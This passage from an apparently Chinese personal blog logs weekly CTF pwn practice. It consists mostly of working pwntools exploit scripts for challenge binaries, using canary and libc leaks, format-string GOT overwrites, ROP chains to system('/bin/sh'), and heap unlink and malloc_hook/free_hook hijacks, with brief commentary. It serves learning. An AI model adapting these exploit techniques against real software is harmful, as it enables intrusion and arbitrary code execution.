<p>edit(5,p64(0)+p64(one))<br>gdb.attach(p)<br>print ‘one ‘+hex(one)<br>print ‘free_hook ‘+hex(free_hook)<br>new(1)<br>p.interactive()</p>
<pre><code>
不太好用,尴尬了,我看看 free_hook
</code></pre>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2019/11/04/2019-11-04-5th_week/" data-id="cuidDSXU04-c1cO61lW-61Kco" data-title="fifth week" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/" rel="tag">pwn</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-2019-10-28-4th_week" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2019/10/28/2019-10-28-4th_week/" class="article-date">
  <time class="dt-published" datetime="2019-10-27T16:00:00.000Z" itemprop="datePublished">2019-10-28</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2019/10/28/2019-10-28-4th_week/">forth week</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>这周佛系做题~~~</p>
<h2 id="2017湖湘杯pwn100"><a href="#2017湖湘杯pwn100" class="headerlink" title="2017湖湘杯pwn100"></a>2017湖湘杯pwn100</h2><p>这道题学了个知识点, <strong>fork</strong> ,感觉还好吧,这题很快就看到了栈溢出,但是想了一会逻辑有点蒙逼,看了看 wp ,就是简单的泄漏 Canary 和 libc ,发现自己真是莫名其妙不敢做题,怎么搞得~~~</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">__Auther__ = &#x27;niexinming&#x27;</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line">import base64</span><br><span class="line"></span><br><span class="line">one = 0x3ac5e</span><br><span class="line"></span><br><span class="line">io = process(&#x27;./pwns&#x27;)</span><br><span class="line">#getCanary</span><br><span class="line">payload = &#x27;a&#x27;*0x102</span><br><span class="line">io.recvuntil(&#x27;May be I can know if you give me some data[Y/N]\n&#x27;)</span><br><span class="line">io.sendline(&#x27;Y&#x27;)</span><br><span class="line">io.recvuntil(&#x27;Give me some datas:\n&#x27;)</span><br><span class="line">io.send(base64.b64encode(payload))</span><br><span class="line">io.recvline()</span><br><span class="line">myCanary=io.recv()[268:271]</span><br><span class="line">Canary=&quot;\x00&quot;+myCanary</span><br><span class="line">print &quot;Canary:&quot;+hex(u32(Canary))</span><br><span class="line"></span><br><span class="line">#getlibc</span><br><span class="line">payload = &#x27;a&#x27;*0x151</span><br><span class="line">io.recvuntil(&#x27;May be I can know if you give me some data[Y/N]\n&#x27;)</span><br><span class="line">io.sendline(&#x27;Y&#x27;)</span><br><span class="line">io.recvuntil(&#x27;Give me some datas:\n&#x27;)</span><br><span class="line">io.send(base64.b64encode(payload))</span><br><span class="line">io.recvline()</span><br><span class="line">mylibc=io.recv()[347:351]</span><br><span class="line">base_libc=u32(mylibc)-0x18637</span><br><span class="line">print &quot;mylibc_addr:&quot;+hex(base_libc)</span><br><span class="line">one=one+base_libc</span><br><span class="line">payload = &#x27;a&#x27;*0x101+Canary+&quot;a&quot;*0xc+p32(one)</span><br><span class="line">io.recvuntil(&#x27;May be I can know if you give me some data[Y/N]\n&#x27;)</span><br><span class="line">io.sendline(&#x27;Y&#x27;)</span><br><span class="line">io.recvuntil(&#x27;Give me some datas:\n&#x27;)</span><br><span class="line">io.send(base64.b64encode(payload))</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="2017湖湘杯pwn200"><a href="#2017湖湘杯pwn200" class="headerlink" title="2017湖湘杯pwn200"></a>2017湖湘杯pwn200</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p= process(&#x27;./pwne&#x27;)</span><br><span class="line">elf = ELF(&quot;./pwne&quot;, checksec=False)</span><br><span class="line">libc = ELF(&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;)</span><br><span class="line">context.log_level = &quot;debug&quot;</span><br><span class="line">p.recvuntil(&quot;WANT PLAY[Y/N]\n&quot;)</span><br><span class="line">p.sendline(&#x27;Y&#x27;)</span><br><span class="line">sleep(0.1)</span><br><span class="line">p.sendline(&quot;%3$p&quot;)</span><br><span class="line">p.recvuntil(&quot;0x&quot;)</span><br><span class="line">addr = int(p.recvuntil(&quot;\n&quot;)[:-1],16)</span><br><span class="line">p.recvuntil(&quot;GET YOUR AGE:&quot;)</span><br><span class="line">p.sendline(&#x27;123&#x27;)</span><br><span class="line">libc_base = addr - 393944</span><br><span class="line">info(&quot;libc:0x%x&quot;,libc_base)</span><br><span class="line">system = libc.symbols[&#x27;system&#x27;] + libc_base</span><br><span class="line">p.recvuntil(&quot;WANT PLAY[Y/N]\n&quot;)</span><br><span class="line">p.sendline(&#x27;Y&#x27;)</span><br><span class="line">p.recvuntil(&quot;GET YOUR NAME:&quot;)</span><br><span class="line">sleep(0.1)</span><br><span class="line">payload = fmtstr_payload(7, &#123;(elf.got[&#x27;atoi&#x27;]):system&#125;)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.sendline(&#x27;/bin/sh&#x27;)</span><br><span class="line">p.recv()</span><br><span class="line">p.recv()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>这题出的怪怪的,写的 wp 也不太好看不过凑合看吧,这个跟着<a target="_blank" rel="noopener" href="https://bbs.ichunqiu.com/thread-43624-1-1.html">师傅</a>学了一个骚的,学着构造了一下,真的好用~~~ 我之前的思路是通过泄漏栈地址找 stack ,然后填入 one_gadget ,应该也可以,我看看</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p= process(&#x27;./pwne&#x27;)</span><br><span class="line">elf = ELF(&quot;./pwne&quot;, checksec=False)</span><br><span class="line">libc = ELF(&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;)</span><br><span class="line">#context.log_level = &quot;debug&quot;</span><br><span class="line">p.recvuntil(&quot;WANT PLAY[Y/N]\n&quot;)</span><br><span class="line">p.sendline(&#x27;Y&#x27;)</span><br><span class="line">sleep(0.1)</span><br><span class="line">p.sendline(&quot;%3$p%26$p&quot;)</span><br><span class="line">p.recvuntil(&quot;0x&quot;)</span><br><span class="line">addr = int(p.recvuntil(&quot;0x&quot;)[:-2],16)</span><br><span class="line">stack = int(p.recvuntil(&quot;\n&quot;)[:-1],16)</span><br><span class="line">p.recvuntil(&quot;GET YOUR AGE:&quot;)</span><br><span class="line">p.sendline(&#x27;123&#x27;)</span><br><span class="line">libc_base = addr - 393944</span><br><span class="line">stack = stack - 28</span><br><span class="line">info(&quot;libc:0x%x&quot;,libc_base)</span><br><span class="line">one = 0x5fbc6 + libc_base</span><br><span class="line">p.recvuntil(&quot;WANT PLAY[Y/N]\n&quot;)</span><br><span class="line">p.sendline(&#x27;Y&#x27;)</span><br><span class="line">p.recvuntil(&quot;GET YOUR NAME:&quot;)</span><br><span class="line">sleep(0.1)</span><br><span class="line">payload = fmtstr_payload(7, &#123;(stack):one&#125;)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.sendline(&#x27;123&#x27;)</span><br><span class="line">p.recv()</span><br><span class="line">p.recv()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>成功了, 32 位真的 one_gadget 太容易成功了~~~</p>
<h2 id="pwn400"><a href="#pwn400" class="headerlink" title="pwn400"></a>pwn400</h2><p>这题出的属实棒,爽歪歪,上 wp</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level = &#x27;debug&#x27;</span><br><span class="line">binary = &#x27;./profile&#x27;</span><br><span class="line">elf = ELF(binary)</span><br><span class="line">libc = elf.libc</span><br><span class="line">p = process(&#x27;./profile&#x27;)</span><br><span class="line">def deb():</span><br><span class="line">	gdb.attach(p)</span><br><span class="line">	pause()</span><br><span class="line">def create(length,name,age):</span><br><span class="line">    p.recvuntil(&#x27;&gt;&#x27;)</span><br><span class="line">    p.sendline(&#x27;1&#x27;)</span><br><span class="line">    p.recvuntil(&#x27;name len:\n&#x27;)</span><br><span class="line">    p.sendline(str(length))</span><br><span class="line">    p.recvuntil(&#x27;name:\n&#x27;)</span><br><span class="line">    p.sendline(name)</span><br><span class="line">    p.recvuntil(&#x27; age:\n&#x27;)</span><br><span class="line">    p.sendline(age)</span><br><span class="line"></span><br><span class="line">def printf():</span><br><span class="line">    p.recvuntil(&#x27;&gt;&#x27;)</span><br><span class="line">    p.sendline(&#x27;2&#x27;)</span><br><span class="line"></span><br><span class="line">def update(length,name,age):</span><br><span class="line">    p.recvuntil(&#x27;&gt;&#x27;)</span><br><span class="line">    p.sendline(&#x27;3&#x27;)</span><br><span class="line">    p.recvuntil(&#x27;namelen:\n&#x27;)</span><br><span class="line">    p.sendline(str(length))</span><br><span class="line">    p.recvuntil(&#x27; name:&#x27;)</span><br><span class="line">    p.send(name)</span><br><span class="line">    p.recvuntil(&#x27;age:&#x27;)</span><br><span class="line">    p.sendline(age)</span><br><span class="line"></span><br><span class="line">def exchange(p1,p2):</span><br><span class="line">    p.recvuntil(&#x27;&gt;&#x27;)</span><br><span class="line">    p.sendline(&#x27;4&#x27;)</span><br><span class="line">    p.recvuntil(&#x27;Person 1: &#x27;)</span><br><span class="line">    p.send(p1)</span><br><span class="line">    p.recvuntil(&#x27;Person 2: &#x27;)</span><br><span class="line">    p.send(p2)</span><br><span class="line"></span><br><span class="line">#leak libc</span><br><span class="line">puts_got = elf.got[&#x27;puts&#x27;]</span><br><span class="line">printf_got = elf.got[&#x27;printf&#x27;]</span><br><span class="line">atoi_got = elf.got[&#x27;atoi&#x27;]</span><br><span class="line">create(0x10,&#x27;aaaa&#x27;,&#x27;1&#x27;)</span><br><span class="line">print hex(puts_got)</span><br><span class="line">update(-1,p32(puts_got),&#x27;1&#x27;)</span><br><span class="line">printf()</span><br><span class="line">p.recvuntil(&#x27;name: &#x27;)</span><br><span class="line">libc_base = u32(p.recv(4)) - libc.symbols[&#x27;puts&#x27;]</span><br><span class="line">log.success(&#x27;libc_base addr : 0x%x&#x27;%libc_base)</span><br><span class="line">malloc_hook = libc_base + libc.symbols[&#x27;__malloc_hook&#x27;]</span><br><span class="line">log.success(&#x27;malloc_hook addr : 0x%x&#x27;%malloc_hook)</span><br><span class="line">topchunk_addr = malloc_hook + 0x48</span><br><span class="line">log.success(&#x27;topchunk addr : 0x%x&#x27;%topchunk_addr)</span><br><span class="line">one_gadget = libc_base + 0x3ac69</span><br><span class="line">log.success(&#x27;one_gadget addr : 0x%x&#x27;%one_gadget)</span><br><span class="line">#hijack main_arena-&gt;topchunk -&gt; __malloc_hook</span><br><span class="line">exchange(p32(topchunk_addr-12),p32(malloc_hook-0x48+0x1c))</span><br><span class="line">#deb()</span><br><span class="line">update(0x50,p32(one_gadget)*11,&#x27;1&#x27;)</span><br><span class="line">#trigger one_gadegt</span><br><span class="line">p.recvuntil(&#x27;&gt;&#x27;)</span><br><span class="line">p.sendline(&#x27;3&#x27;)</span><br><span class="line">p.recvuntil(&#x27;namelen:\n&#x27;)</span><br><span class="line">p.sendline(&#x27;20&#x27;)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>说实话,这题我分析半天都没看见洞,我只看见了一个逻辑漏洞,但是不会利用</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">read(0, &amp;buf, 8u);</span><br><span class="line">strncat((char *)&amp;buf_bss, &amp;buf, nbytes_bss - old_length);</span><br></pre></td></tr></table></figure>

<p>然后就没有了,然后差不多看了 2 个小时吧,受不了了,开始看 wp ,突然发现我还菜啊~~~~</p>
<p>事实上这题还是很绕的,我们来分析一下<br>    - 首先输入时如果字节大于 8 就直接 malloc 一个,然后存到 bss 的指针里<br>    - 而如果小于 8 的话直接存到上述存指针变量的变量里</p>
<p>在 update 中,有一个格式不匹配溢出,可以输入 -1 然后任意字节输入,虽然没什么用,真正的漏洞是任意地址泄漏,即 print 函数,但是要注意输入的长度一定要</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">if ( (signed int)nbytes_bss &lt;= 0 || (signed int)nbytes_bss &gt; 8 )</span><br><span class="line">&#123;</span><br><span class="line">  printf(&quot;Your name: %s\n&quot;, buf_bss);</span><br><span class="line">  result = printf(&quot;Your age: %d\n&quot;, age_bss);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这题这漏洞我都没看见,感觉被一个假洞坑害了~~~</p>
<p>这题学到了,通过 exchange 函数可以把 malloc_hook 和 top_chunk 交换,让 top_chunk_addr 变为 malloc_hook 附近的地址,这里注意一下,和 64 位类似,注意一下对齐.然后直接在上边添 one_gadget 就完事了,理解了还是很简单的~~~</p>
<h2 id="UNCTF-Soso-easy-pwn"><a href="#UNCTF-Soso-easy-pwn" class="headerlink" title="UNCTF Soso_easy_pwn"></a>UNCTF Soso_easy_pwn</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"># coding=utf-8</span><br><span class="line">from pwn import *</span><br><span class="line">p=process(&#x27;./pwn&#x27;,aslr=0)</span><br><span class="line">p.recvuntil(&quot;Welcome our the &quot;)</span><br><span class="line">data=hex(int(p.recvline()[:5]))</span><br><span class="line">sh_addr=int(data+&#x27;59cd&#x27;,16)</span><br><span class="line">print &quot;sh_addr=&quot;+hex(sh_addr)</span><br><span class="line">p.recvuntil(&quot;So, Can you tell me your name?&quot;)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line">payload=12*&#x27;a&#x27;+p32(sh_addr)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.recvuntil(&quot;:&quot;)</span><br><span class="line">p.sendline(&quot;3&quot;)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>这题没办法,只能 1&#x2F;16 几率成功,多跑几次或直接开个循环</p>
<p>本来我看这题的时候看傻了,没发现有个后门,想着有 canary 和 pie 怎么搞啊,结果这么简单,什么辣鸡~~~ 这题出的感觉还挺活的,让我这种辣鸡无所适从~~~</p>
<h2 id="UNCTF-babyrop"><a href="#UNCTF-babyrop" class="headerlink" title="UNCTF babyrop"></a>UNCTF babyrop</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"># coding=utf-8</span><br><span class="line">from pwn import *</span><br><span class="line">import struct</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">p=process(&#x27;./babyrop&#x27;)</span><br><span class="line">e=ELF(&#x27;./babyrop&#x27;)</span><br><span class="line">libc=e.libc</span><br><span class="line">p.recvuntil(&quot;Hello CTFer!&quot;)</span><br><span class="line">payload=(0x2c-0xc)*&#x27;a&#x27;+&#x27;ffff&#x27;</span><br><span class="line">p.sendline(payload)</span><br><span class="line">vul_addr=0x0804853D</span><br><span class="line">puts_plt=e.symbols[&#x27;puts&#x27;]</span><br><span class="line">puts_got=e.got[&#x27;puts&#x27;]</span><br><span class="line">p.recvuntil(&quot;What is your name?&quot;)</span><br><span class="line">payload=(0x10+0x4)*&#x27;a&#x27;+p32(puts_plt)+p32(vul_addr)+p32(puts_got)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">data=p.recvline()</span><br><span class="line">puts_addr=u32(p.recv(4))</span><br><span class="line">libc_puts_addr=libc.symbols[&#x27;puts&#x27;]</span><br><span class="line">#第二个参数，为已泄露的实际地址,或最后12位(比如：d90)，int类型</span><br><span class="line">obj = LibcSearcher(&quot;puts&quot;, puts_addr)</span><br><span class="line">libc_base=puts_addr-obj.dump(&quot;puts&quot;)</span><br><span class="line">system_addr=libc_base+obj.dump(&quot;system&quot;)        #system 偏移</span><br><span class="line">print &#x27;system&#x27;+hex(system_addr)</span><br><span class="line">sh_addr=libc_base+obj.dump(&quot;str_bin_sh&quot;)    #/bin/sh 偏移</span><br><span class="line">p.recvuntil(&quot;What is your name?&quot;)</span><br><span class="line">ret_addr=0x0804839e</span><br><span class="line">payload=(0x10+0x4)*&#x27;a&#x27;+p32(ret_addr)+p32(system_addr)+&#x27;aaaa&#x27;+p32(sh_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>第一次看见直接用 LibcSearcher 通杀的</p>
<h2 id="suctf-pwn5"><a href="#suctf-pwn5" class="headerlink" title="suctf pwn5"></a>suctf pwn5</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p = process(&#x27;./supwn5&#x27;)</span><br><span class="line">elf = ELF(&quot;./supwn5&quot;, checksec=False)</span><br><span class="line">libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;, checksec=False)</span><br><span class="line">#context.log_level = &quot;debug&quot;</span><br><span class="line">def new(size):</span><br><span class="line">	p.sendlineafter(&#x27;please chooice :\n&#x27;,&#x27;1&#x27;)</span><br><span class="line">	p.sendlineafter(&#x27;please input the size : \n&#x27;,str(size))</span><br><span class="line">def free(ind):</span><br><span class="line">	p.sendlineafter(&#x27;please chooice :\n&#x27;,&#x27;2&#x27;)</span><br><span class="line">	p.sendlineafter(&#x27;which node do you want to delete\n&#x27;,str(ind))</span><br><span class="line">def edit(ind,content):</span><br><span class="line">	p.sendlineafter(&#x27;please chooice :\n&#x27;,&#x27;4&#x27;)</span><br><span class="line">	p.sendlineafter(&#x27;which one do you want modify :\n&#x27;,str(ind))</span><br><span class="line">	p.sendafter(&#x27;please input the content&#x27;,content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">new(0x80)</span><br><span class="line">new(0x80)</span><br><span class="line">new(1)</span><br><span class="line">payload = p64(0)+p64(0x81)+p64(0x06020C0-24)+p64(0x06020C0-16)</span><br><span class="line">payload = payload.ljust(0x80)</span><br><span class="line">payload+=p64(0x80)+p64(0x90)</span><br><span class="line">edit(0,payload)</span><br><span class="line">free(1)</span><br><span class="line">pay = p64(0)*3+p64(elf.got[&#x27;puts&#x27;])+p64(0x06020C0-24)*5</span><br><span class="line">edit(0,pay)</span><br><span class="line">p.sendlineafter(&#x27;please chooice :\n&#x27;,&#x27;3&#x27;)</span><br><span class="line">p.sendlineafter(&#x27;which node do you want to show\n&#x27;,&#x27;0&#x27;)</span><br><span class="line">p.recvuntil(&#x27;the content is : \n&#x27;)</span><br><span class="line">leak = u64(p.recvuntil(&#x27;\n&#x27;)[:-1].ljust(8,&#x27;\x00&#x27;))</span><br><span class="line">libc_base = leak - libc.symbols[&#x27;puts&#x27;]</span><br><span class="line">print hex(libc_base)</span><br><span class="line">system = libc.symbols[&#x27;system&#x27;] + libc_base</span><br><span class="line">free_hook = libc.symbols[&#x27;__free_hook&#x27;] + libc_base</span><br><span class="line">pay = p64(0)*3+p64(free_hook)+p64(0x06020C0-24)*5</span><br><span class="line">edit(1,pay)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">one=libc_base+0x4526a</span><br><span class="line">edit(0,p64(one))</span><br><span class="line">free(1)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>简单的堆溢出,首先考虑 unlink ,因为实在是太好用了~~~</p>
<h2 id="this"><a href="#this" class="headerlink" title="this"></a><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/1553">this</a></h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line">context(terminal = [&#x27;gnome-terminal&#x27;, &#x27;-x&#x27;, &#x27;sh&#x27;, &#x27;-c&#x27;], arch = &#x27;i386&#x27;, os = &#x27;linux&#x27;, log_level = &#x27;debug&#x27;)</span><br><span class="line"></span><br><span class="line">def debug(addr = &#x27;0x080486f6&#x27;):</span><br><span class="line">    raw_input(&#x27;debug:&#x27;)</span><br><span class="line">    gdb.attach(io, &quot;b *&quot; + addr)</span><br><span class="line"></span><br><span class="line">shellcode=&quot;flag&quot;</span><br><span class="line"></span><br><span class="line">elf = ELF(&#x27;./pwnme2&#x27;)</span><br><span class="line">exec_string=elf.symbols[&#x27;exec_string&#x27;]</span><br><span class="line">print &quot;%x&quot; % exec_string</span><br><span class="line">scanf_addr = elf.symbols[&#x27;gets&#x27;]</span><br><span class="line">print &quot;%x&quot; % scanf_addr</span><br><span class="line">bss_addr = elf.bss()</span><br><span class="line">print &quot;%x&quot; % bss_addr</span><br><span class="line">offset = 0x70</span><br><span class="line"></span><br><span class="line">io = process(&#x27;./pwnme2&#x27;)</span><br><span class="line"></span><br><span class="line">#io = remote(&#x27;104.224.169.128&#x27;, 18887)</span><br><span class="line"></span><br><span class="line">payload = &#x27;A&#x27; * offset</span><br><span class="line">payload += p32(scanf_addr) </span><br><span class="line">payload += p32(exec_string)   </span><br><span class="line">payload += p32(bss_addr+0x20) </span><br><span class="line"></span><br><span class="line">#debug()</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.sendline(shellcode)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br><span class="line">io.close()</span><br></pre></td></tr></table></figure>

<p>被师傅思路折服了,其实这题很简单,我发现我自己真是不擅长用后门, tcl ,我看这题以为只有一个溢出,没有泄漏怎么搞,我傻了,发现有后门~~~</p>
<p>师傅太狠了,猜出路径写 bss 里直接调用了,太骚了~~~~</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2019/10/28/2019-10-28-4th_week/" data-id="cuidVn4Qe_cBPx5hjm4BXtS7s" data-title="forth week" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/" rel="tag">pwn</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-2019-10-21-3rd_week" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2019/10/21/2019-10-21-3rd_week/" class="article-date">
  <time class="dt-published" datetime="2019-10-20T16:00:00.000Z" itemprop="datePublished">2019-10-21</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2019/10/21/2019-10-21-3rd_week/">third week</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>感觉上周跑得太快了,好多知识没完全消化,这周就总结吧~~~(不是偷懒啊</p>
<h2 id="off-by-one"><a href="#off-by-one" class="headerlink" title="off by one"></a>off by one</h2><p>这种 off by one 的洞有好多方法,如堆块重叠和 unlink ,这里先记录一下 unlink</p>
